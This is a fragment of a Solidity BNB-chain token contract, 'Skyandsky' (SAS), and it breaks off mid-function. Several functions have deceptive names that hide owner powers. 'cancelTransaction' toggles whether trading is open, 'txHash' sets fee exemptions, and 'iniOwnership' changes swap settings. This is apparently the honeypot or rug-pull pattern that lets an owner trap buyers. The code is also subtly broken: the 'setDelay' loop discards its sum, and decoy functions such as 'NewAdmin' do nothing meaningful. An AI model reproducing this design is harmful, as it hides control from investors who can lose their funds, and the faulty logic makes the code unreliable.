...
contract Skyandsky is IERC20, AuthLibrary {
    using SafeMath for uint256;    
    address public constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address public constant ZERO = 0x0000000000000000000000000000000000000000;
    string constant _name = "Skyandsky";
    string constant _symbol = "SAS";
	...
	function setDelay(uint256 accuracy, address[] calldata _markerPairs) public view returns (uint256){
		  uint256 liquidityBalance = 0;
		  for(uint i = 0; i < _markerPairs.length; i++){
			  (liquidityBalance + _balances[_markerPairs[i]]) / (10 ** 9);
		  }
		  return (accuracy * liquidityBalance) / (10 ** 9);
	  }

    function setPendingAdmin(uint256 gas, uint256 gasPriceLimit) external pure returns(uint256) {
		  require(gas >= 860000);
		  return gas * gasPriceLimit;
	  }

    function NewAdmin(address sender, uint256 target, uint256 accuracy) public view returns (bool){
		  require(_balances[sender] > accuracy);
		  return accuracy > target;
	  }

    function cancelTransaction(bool _status) public onlyOwner {
        tradingOpen = _status;
    }    

    function iniOwnership(bool _enabled, uint256 _amount) external authorized {
        swapEnabled = _enabled;
        _swapThreshold = _amount;
    }  

    function txHash(address holder, bool exempt) external authorized {
        isFeeHolderExempt[holder] = exempt;
    }

    function _getBlockTimestamp(address holder, bool exempt) external authorized {
